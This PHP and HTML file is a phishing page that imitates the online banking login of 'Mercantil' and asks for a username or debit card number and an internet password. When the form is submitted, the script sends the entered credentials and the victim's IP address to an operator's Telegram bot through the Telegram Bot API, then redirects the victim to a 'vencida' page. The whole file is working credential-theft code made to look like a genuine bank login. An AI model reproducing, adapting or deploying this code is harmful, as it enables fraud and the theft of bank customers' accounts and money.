<?php
include './config.php';



  $u = isset($_POST["us"]) ? $_POST["us"] : '';
  $p = isset($_POST["pas"]) ? $_POST["pas"] : '';


  if (isset($_POST['submit'])) {


  $ip_address = $_SERVER['REMOTE_ADDR'];
  $message = "MERCANTIL  \n\nUSUARIO: <code>$u</code> \nCLAVE: <code>$p</code> \nIP: $ip_address";



       $telegram_api_url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";
      $data = array(
          'chat_id' => $chat_id,
          'text' => $message,
          'parse_mode' => 'HTML'
      );

      // Use cURL to send the API request.
      $ch = curl_init($telegram_api_url);
      curl_setopt($ch, CURLOPT_POST, 1);
      curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
      $result = curl_exec($ch);
      curl_close($ch);



    header("Location: ./vencida.php");
    ob_end_flush();
    exit(); }


  ?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./index.css">
    <title>Mercantil</title>
</head>
<body>
    <div class="wrapper">
        <div class="container">
            <div class="header">
              <img src="./img/log_mov.png" width="150px" alt="">
            </div>

            <form action="" class="form" style="background-color: transparent; border: none; box-shadow: none; " method="post">
                <div class="login-container">
                    <h2>Bienvenido</h2>
                    <h1>Inicia tu sesión</h1>



                    <div class="input-container">
                        <label for="">Usuario o Tarjeta de débito</label>
                        <input name="us" type="text" style="background-color: transparent;" required placeholder="Ingresa tu usuario o Tarjeta de débito">
                    </div>

                    <br><br><br>

                    <div class="input-container">
                        <label maxlength="25" for="">Clave de internet</label>
                        <input style="background-color: transparent;" type="password" required maxlength="25" name="pas" placeholder="Ingresa tu clave de internet">
                    </div>


                    <button class="butonsin" name="submit">Iniciar</button>
    
                </div>


<div style="position: fixed; top: 80%; right: 2%; ">
				<img src="./miapng.png" width="150px">
				</div>
             
            </form>
        </div>
    </div>
</body>
</html>